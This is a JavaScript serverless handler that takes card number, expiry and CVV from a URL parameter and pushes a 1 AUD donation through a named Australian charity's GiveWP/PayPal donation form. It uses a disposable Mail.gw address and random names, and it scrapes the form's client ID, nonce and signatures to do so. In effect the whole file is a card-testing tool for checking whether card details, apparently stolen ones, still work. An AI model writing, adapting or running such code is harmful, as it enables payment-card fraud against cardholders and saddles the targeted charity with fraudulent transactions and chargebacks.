const fs = require('fs');
const cookieJar = new Map();

// Helper for random strings
const randomString = (length) =>
    Array(length)
        .fill(0)
        .map(() => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)])
        .join('');

// Updated Mail System using Mail.gw (Public API)
async function getPublicEmail() {
    try {
        const domainRes = await fetch('https://api.mail.gw/domains');
        const domainData = await domainRes.json();
        const domain = domainData['hydra:member'][0].domain;
        const address = `${randomString(10)}@${domain}`;
        const password = randomString(12);
        
        await fetch('https://api.mail.gw/accounts', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address, password })
        });
        
        return address;
    } catch (e) {
        return `${randomString(10)}@outlook.com`; // Fallback
    }
}

async function request(url, options = {}) {
    const headers = new Headers(options.headers || {});
    const cookieString = Array.from(cookieJar)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ');

    if (cookieString) headers.set('cookie', cookieString);
    if (!headers.has('user-agent')) {
        headers.set('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36');
    }

    const response = await fetch(url, { ...options, headers });
    if (response.headers.getSetCookie) {
        response.headers.getSetCookie().forEach((cookie) => {
            const [name, value] = cookie.split(';')[0].split('=');
            if (name && value) cookieJar.set(name.trim(), value.trim());
        });
    }
    return response;
}

// Vercel Serverless Handler
export default async function handler(req, res) {
    if (req.method !== 'GET') return res.status(405).send('Method Not Allowed');

    const { data: inputData } = req.query; // Usage: /api?data=number|mm|yy|cvv
    if (!inputData) return res.status(400).json({ error: 'Missing data parameter' });

    const [number, month, yearShort, cvv] = inputData.split('|');
    const userEmail = await getPublicEmail();
    const user = {
        firstName: randomString(6),
        lastName: randomString(6),
        email: userEmail,
    };

    try {
        const html = await (await request('https://animalrights.org.au/donate-now/')).text();
        const formUrl = html.match(/data-form-view-url='([^']+)'/)[1].replace(/&#038;/g, '&');
        const formResponse = await request(formUrl);
        const formText = await formResponse.text();
        const exported = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/)[1];
        const data = JSON.parse(exported);

        const settings = data.registeredGateways.find((g) => g.id === 'paypal-commerce')?.settings || data.registeredGateways[0].settings;

        const clientId = settings.sdkOptions.clientId;
        const auth = Buffer.from(`${clientId}:`).toString('base64');
        const tokenResponse = await request('https://www.paypal.com/v1/oauth2/token', {
            method: 'POST',
            headers: {
                'Authorization': `Basic ${auth}`,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json'
            },
            body: 'grant_type=client_credentials'
        });
        const tokenData = await tokenResponse.json();
        const accessToken = tokenData.access_token;

        const params = new URLSearchParams(new URL(data.donateUrl).search);
        const tokens = {
            formId: settings.donationFormId.toString(),
            formHash: settings.donationFormNonce,
            signature: params.get('givewp-route-signature'),
            signatureExpiration: params.get('givewp-route-signature-expiration'),
            signatureId: params.get('givewp-route-signature-id'),
        };

        const formData = new FormData();
        Object.entries({
            action: 'give_paypal_commerce_create_order',
            'give-form-id': tokens.formId,
            'give-form-hash': tokens.formHash,
            give_payment_mode: 'paypal-commerce',
            'give-amount': '1',
            give_first: user.firstName,
            give_last: user.lastName,
            give_email: user.email,
            'give-cs-form-currency': 'AUD',
        }).forEach(([key, value]) => formData.append(key, value));

        const orderResponse = await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
            method: 'POST',
            body: formData,
        });
        const orderData = await orderResponse.json();
        const orderId = orderData.data.id;

        const confirmResponse = await request(
            `https://www.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
            {
                method: 'POST',
                headers: {
                    authorization: `Bearer ${accessToken}`,
                    'content-type': 'application/json',
                },
                body: JSON.stringify({
                    payment_source: {
                        card: {
                            number,
                            security_code: cvv,
                            expiry: `${'20' + yearShort}-${month}`,
                        },
                    },
                }),
            }
        );

        const confirmData = await confirmResponse.json();
        res.status(200).json(confirmData);

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}
